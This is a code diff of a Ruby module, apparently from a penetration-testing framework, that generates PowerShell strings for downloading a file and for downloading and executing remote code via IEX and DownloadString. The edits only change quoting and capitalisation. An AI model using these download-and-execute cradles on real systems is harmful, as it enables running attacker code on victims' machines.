@@ -16,7 +16,7 @@ module Powershell
     # @return [String] Powershell code to download a file
     def self.download(src, target)
       target ||= '$pwd\\' << src.split('/').last
-      %Q^(new-object System.Net.WebClient).DownloadFile("#{src}", "#{target}")^
+      %Q^(new-object System.Net.WebClient).DownloadFile('#{src}', '#{target}')^
     end
 
     #
@@ -82,9 +82,9 @@ module Powershell
     # @return [String] PowerShell code to download and exec the url
     def self.download_and_exec_string(url, iex = true)
       if iex
-        %Q^ IEX ((new-object net.webclient).downloadstring('#{url}'))^
+        %Q^IEX ((new-object Net.WebClient).DownloadString('#{url}'))^
       else
-        %Q^&([scriptblock]::create((new-object net.webclient).downloadstring('#{url}')))^
+        %Q^&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')))^
       end
     end
 
